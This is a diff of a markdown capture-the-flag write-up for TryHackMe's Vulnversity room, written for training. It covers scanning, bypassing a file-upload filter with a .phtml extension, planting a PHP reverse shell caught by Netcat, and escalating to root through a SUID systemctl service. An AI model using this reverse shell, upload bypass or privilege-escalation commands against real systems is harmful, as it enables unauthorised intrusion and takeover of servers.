@@ -1,34 +1,35 @@
-# Vulnversity-TryHackMe
+# Vulnversity
 
-----
+## Vulnversity-TryHackMe
 
-# Info
+***
 
-| Name         |   Lazy Admin                                      | 
-| ------       | -----------------                                 |
-| Room link    | https://tryhackme.com/room/vulnversity            |  
-| Created by   | [tryhackme](https://tryhackme.com/p/tryhackme)    |
-| solving date | March 31th 2022                                      |
----
+## Info
 
+| Name         | Lazy Admin                                     |
+| ------------ | ---------------------------------------------- |
+| Room link    | https://tryhackme.com/room/vulnversity         |
+| Created by   | [tryhackme](https://tryhackme.com/p/tryhackme) |
+| solving date | March 31th 2022                                |
+| ---          |                                                |
 
+![Untitled](../Vulnversity/images/Untitled.png)
 
-![Untitled](images/Untitled.png)
+### Reconnaissance
 
-## Reconnaissance
+*   Let's start a quick Nmap scan to check the common ports
 
-- Let's start a quick Nmap scan to check the common ports
-    
-    ![Untitled](images/Untitled%201.png)
-    
-    - Alright, there are 6 ports open
-- maybe there are other ports open, so let’s scan all the ports with -p- option
-    - we can use -sV to detect the version of each service
-    - -sC to run   nmap default scripts
-    - —script vuln to scan vulnerability
-    - -sS  → TCP SYN scan (Stealth scan)
-    - -oN <file>  to save a Normal format file
-    
+    <img src="../Vulnversity/images/Untitled 1.png" alt="Untitled" data-size="original">
+
+    * Alright, there are 6 ports open
+*   maybe there are other ports open, so let’s scan all the ports with -p- option
+
+    * we can use -sV to detect the version of each service
+    * \-sC to run nmap default scripts
+    * —script vuln to scan vulnerability
+    * \-sS → TCP SYN scan (Stealth scan)
+    * \-oN to save a Normal format file
+
     ```
     ╰─# nmap -sV -sC --script vuln -p- -sS $target -oN Vulnversity_nmap                                                                                                                                 130 ↵
     Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-31 08:00 EET
@@ -380,7 +381,7 @@
     |     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
     |_    	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
     Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
-    
+
     Host script results:
     |_smb-vuln-ms10-054: false
     |_smb-vuln-ms10-061: false
@@ -392,107 +393,89 @@
     |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
     |       while working on smb-enum-sessions.
     |_          
-    
+
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 636.90 seconds
     ```
-    
-- Questions
-    
+*   Questions
+
     > Question1: No answer is needed
-    > 
-    
+
     > Question2: Scan the box, how many ports are open?
-    > 
-    > - answer: 6
-    
-    > Question3: What version of the squid proxy is running on the machine?
-    we can see from the previous scan `squid HTTP proxy 3.5.12`
-    > 
-    > - answer: 3.5.12
-    
-    > Question4: How many ports will nmap scan if the flag -p-400 was used?
-    absolutely 400 🙂
-    > 
-    > - answer: 400
-    
-    > Question4: Using the nmap flag -n what will it not resolve?
-    we can use man nmap | grep -- -n`  to make sure its functionality if we forgot “n (No DNS resolution)”
-    > 
-    > - answer: DNS
-    
-    > Question5: What is the most likely operating system this machine is running?
-    we can see in apache service line it’s Ubuntu OS
-    > 
-    > 
-    > ![Untitled](images/Untitled%202.png)
-    > 
-    > - answer: ubuntu
-    
+    >
+    > * answer: 6
+
+    > Question3: What version of the squid proxy is running on the machine? we can see from the previous scan `squid HTTP proxy 3.5.12`
+    >
+    > * answer: 3.5.12
+
+    > Question4: How many ports will nmap scan if the flag -p-400 was used? absolutely 400 🙂
+    >
+    > * answer: 400
+
+    > Question4: Using the nmap flag -n what will it not resolve? we can use man nmap | grep -- -n\` to make sure its functionality if we forgot “n (No DNS resolution)”
+    >
+    > * answer: DNS
+
+    > Question5: What is the most likely operating system this machine is running? we can see in apache service line it’s Ubuntu OS
+    >
+    > <img src="../Vulnversity/images/Untitled 2.png" alt="Untitled" data-size="original">
+    >
+    > * answer: ubuntu
+
     > Question6:What port is the web server running on?
-    > 
-    > 
-    > ![Untitled](images/Untitled%203.png)
-    > 
-    > - answer: 3333
-    
-    > Question7:Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
-    No answer needed
-    > 
+    >
+    > <img src="../Vulnversity/images/Untitled 3.png" alt="Untitled" data-size="original">
+    >
+    > * answer: 3333
 
----
+    > Question7:Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background) No answer needed
 
-## Locating directories using GoBuster
+***
 
-- Let’s browse the website
-- note that HTTP service running on port 3333, not 80, so you should tell your web browser that by typing targetIP:3333 instead of targetIP in the URL
-    
-    ![Untitled](images/Untitled%204.png)
-    
-- Great, Let’s fuzz
-- I prefer ffuf, so I will use it first because it’s so fast
-- Don’t forget to specify the port number “3333”
-    
-    ![Untitled](images/Untitled%205.png)
-    
-- now we can use gobuster to locate directories
-- `gobuster dir --url http//TargetIp:3333 -w Wordlist`
-    
-    ![Untitled](images/Untitled%206.png)
-    
-- as we can see gobuster and ffuf show the same result, but ffuf is faster than gobuster
-- Questions
-    
+### Locating directories using GoBuster
+
+* Let’s browse the website
+*   note that HTTP service running on port 3333, not 80, so you should tell your web browser that by typing targetIP:3333 instead of targetIP in the URL
+
+    <img src="../Vulnversity/images/Untitled 4.png" alt="Untitled" data-size="original">
+* Great, Let’s fuzz
+* I prefer ffuf, so I will use it first because it’s so fast
+*   Don’t forget to specify the port number “3333”
+
+    <img src="../Vulnversity/images/Untitled 5.png" alt="Untitled" data-size="original">
+* now we can use gobuster to locate directories
+*   `gobuster dir --url http//TargetIp:3333 -w Wordlist`
+
+    <img src="../Vulnversity/images/Untitled 6.png" alt="Untitled" data-size="original">
+* as we can see gobuster and ffuf show the same result, but ffuf is faster than gobuster
+*   Questions
+
     > Question1: no answer is needed
-    > 
-    
-    > Question2: What is the directory that has an upload form page?
-    I think it isn’t CSS or fonts or images or index.html or js or server-status
-    let’s check what is internal
-    > 
-    > 
-    > ![Untitled](images/Untitled%207.png)
-    > 
-    > - yes it  is an upload page
-    > - answer: /internal
 
----
+    > Question2: What is the directory that has an upload form page? I think it isn’t CSS or fonts or images or index.html or js or server-status let’s check what is internal
+    >
+    > <img src="../Vulnversity/images/Untitled 7.png" alt="Untitled" data-size="original">
+    >
+    > * yes it is an upload page
+    > * answer: /internal
 
-## Compromise the webserver
+***
 
-- Let’s try to upload a few file types
-- we can see txt and PHP are blocked
+### Compromise the webserver
 
-![Untitled](images/Untitled%208.png)
+* Let’s try to upload a few file types
+* we can see txt and PHP are blocked
 
-- instead of checking each extension manually, we are going to use Burp Suite Intruder
-- start Burp Suite then intercept the request send it to the Intruder
-- select the extension then press “Add§”
-    
-    ![Untitled](images/Untitled%209.png)
-    
-- file extension payload
-    
+![Untitled](<../Vulnversity/images/Untitled 8.png>)
+
+* instead of checking each extension manually, we are going to use Burp Suite Intruder
+* start Burp Suite then intercept the request send it to the Intruder
+*   select the extension then press “Add§”
+
+    <img src="../Vulnversity/images/Untitled 9.png" alt="Untitled" data-size="original">
+*   file extension payload
+
     ```
     php2
     php3
@@ -506,19 +489,18 @@
     phps
     shtml
     ```
-    
-- Start attack
-    
-    ![Untitled](images/Untitled%2010.png)
-    
-    - we can see that “phtml” is the only response with different Length, so let’s check the response content
-        
-        ![Untitled](images/Untitled%2011.png)
-        
-        - Great😃, successful upload
-- we have discovered that the server running is apache, so we should use PHP reverse shell
-- we can find a reverse shell in “/usr/share/webshells/php" in kali Linux or we can use [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)  or [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)
-- I will use PHP reverse shell in /usr/share/webshells/php kali Linux
+*   Start attack
+
+    <img src="../Vulnversity/images/Untitled 10.png" alt="Untitled" data-size="original">
+
+    *   we can see that “phtml” is the only response with different Length, so let’s check the response content
+
+        <img src="../Vulnversity/images/Untitled 11.png" alt="Untitled" data-size="original">
+
+        * Great😃, successful upload
+* we have discovered that the server running is apache, so we should use PHP reverse shell
+* we can find a reverse shell in “/usr/share/webshells/php" in kali Linux or we can use [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) or [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)
+* I will use PHP reverse shell in /usr/share/webshells/php kali Linux
 
 ```php
 php-reverse-shell.php                  
@@ -713,97 +695,87 @@ function printit ($string) {
 ?>
 ```
 
-- start a Netcat listener
-    
-    ![Untitled](images/Untitled%2012.png)
-    
-- change the IP and the port number in the reverse shell to your IP and listening port
-- change the file extension to phtml so we can upload it
-    
-    ![Untitled](images/Untitled%2013.png)
-    
-- upload the file
-    
-    ![Untitled](images/Untitled%2014.png)
-    
-- we don’t know the location of uploaded files so we will fuzz the website to find “juba.phtml”
-    
-    ![Untitled](images/Untitled%2015.png)
-    
-    - it seems that “uploads” directory is what we are looking for
-    - add our file name “juba” to the wordlist then try to fuzz again
-        
-        ![Untitled](images/Untitled%2016.png)
-        
-        - when ffuf found juba the reverse shell started and connected to our listener
-            
-            ![Untitled](images/Untitled%2017.png)
-            
-            - Great 🙂
-- Questions
-    
+*   start a Netcat listener
+
+    <img src="../Vulnversity/images/Untitled 12.png" alt="Untitled" data-size="original">
+* change the IP and the port number in the reverse shell to your IP and listening port
+*   change the file extension to phtml so we can upload it
+
+    <img src="../Vulnversity/images/Untitled 13.png" alt="Untitled" data-size="original">
+*   upload the file
+
+    <img src="../Vulnversity/images/Untitled 14.png" alt="Untitled" data-size="original">
+*   we don’t know the location of uploaded files so we will fuzz the website to find “juba.phtml”
+
+    <img src="../Vulnversity/images/Untitled 15.png" alt="Untitled" data-size="original">
+
+    * it seems that “uploads” directory is what we are looking for
+    *   add our file name “juba” to the wordlist then try to fuzz again
+
+        <img src="../Vulnversity/images/Untitled 16.png" alt="Untitled" data-size="original">
+
+        *   when ffuf found juba the reverse shell started and connected to our listener
+
+            <img src="../Vulnversity/images/Untitled 17.png" alt="Untitled" data-size="original">
+
+            * Great 🙂
+*   Questions
+
     > Question1: Try upload a few file types to the server, what common extension seems to be blocked?
-    > 
-    > - answer: PHP
-    
+    >
+    > * answer: PHP
+
     > Question2: No answer needed
-    > 
-    
+
     > Question3: Run this attack, what extension is allowed?
-    > 
-    > - answer: phtml
-    
+    >
+    > * answer: phtml
+
     > Question4: No answer needed
-    > 
-    
-    > Question5: What is the name of the user who manages the webserver?
-    let’s check /etc/passwd
-    > 
-    > 
-    > ![Untitled](images/Untitled%2018.png)
-    > 
-    > bill is a non-Default account 
-    > 
-    > - answer: bill
-    
+
+    > Question5: What is the name of the user who manages the webserver? let’s check /etc/passwd
+    >
+    > <img src="../Vulnversity/images/Untitled 18.png" alt="Untitled" data-size="original">
+    >
+    > bill is a non-Default account
+    >
+    > * answer: bill
+
     > Question 6: What is the user flag?
-    > 
-    > 
-    > ![Untitled](images/Untitled%2019.png)
-    > 
-    > - Get your flag by yourself
+    >
+    > <img src="../Vulnversity/images/Untitled 19.png" alt="Untitled" data-size="original">
+    >
+    > * Get your flag by yourself
 
----
+***
 
-## Stabilizing our shell
+### Stabilizing our shell
 
-- first, check if python is installed
+* first, check if python is installed
 
-`$ which python
-/usr/bin/python`
+`$ which python /usr/bin/python`
 
-- great it is installed
-- let’s spawn the shell using `python -c "from pty import spawn; spawn('/bin/bash')`
-- set TERM environment variable using `export TERM=xterm` this will give us access to term commands such as `clear`.
-- background the reverse shell using CTRL + Z then type `stty raw -echo ; fg` This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
+* great it is installed
+* let’s spawn the shell using `python -c "from pty import spawn; spawn('/bin/bash')`
+* set TERM environment variable using `export TERM=xterm` this will give us access to term commands such as `clear`.
+* background the reverse shell using CTRL + Z then type `stty raw -echo ; fg` This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.
 
-![Untitled](images/Untitled%2020.png)
+![Untitled](<../Vulnversity/images/Untitled 20.png>)
 
----
+***
 
-## Privilege Escalation
+### Privilege Escalation
 
-- search for SUID and SGID files `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
-    
-    ![Untitled](images/Untitled%2021.png)
-    
-- we can see that /bin/systemctl is a SUID file, so we can create a systemctl service and run it with root privilege
-- let’s check how to do this in [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/)
-- first, create a file and store it in “flag” variable
-- create a Service file and store it in “flag” variable
-    - ExecStart=”what we want”
-    - in our case we make the service get the content of root.txt file and redirect it to /tmp/flag.txt
-- create a link to  the file
+*   search for SUID and SGID files `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`
+
+    <img src="../Vulnversity/images/Untitled 21.png" alt="Untitled" data-size="original">
+* we can see that /bin/systemctl is a SUID file, so we can create a systemctl service and run it with root privilege
+* let’s check how to do this in [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/)
+* first, create a file and store it in “flag” variable
+* create a Service file and store it in “flag” variable
+  * ExecStart=”what we want”
+  * in our case we make the service get the content of root.txt file and redirect it to /tmp/flag.txt
+* create a link to the file
 
 ```bash
 flag=$(mktemp).service
@@ -815,12 +787,12 @@ WantedBy=multi-user.target' > $flag
 /bin/systemctl enable --now $flag
 ```
 
-![Untitled](images/Untitled%2022.png)
+![Untitled](<../Vulnversity/images/Untitled 22.png>)
 
----
+***
 
-## I hope you enjoyed the write-up
- 
-- [Linkedin](https://www.linkedin.com/in/juba0x00/)
-- [Twitter](https://twitter.com/juba0x00/)
-- [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
+### I hope you enjoyed the write-up
+
+* [Linkedin](https://www.linkedin.com/in/juba0x00/)
+* [Twitter](https://twitter.com/juba0x00/)
+* [TryHackMe](https://tryhackme.com/p/Juba0x430x55)
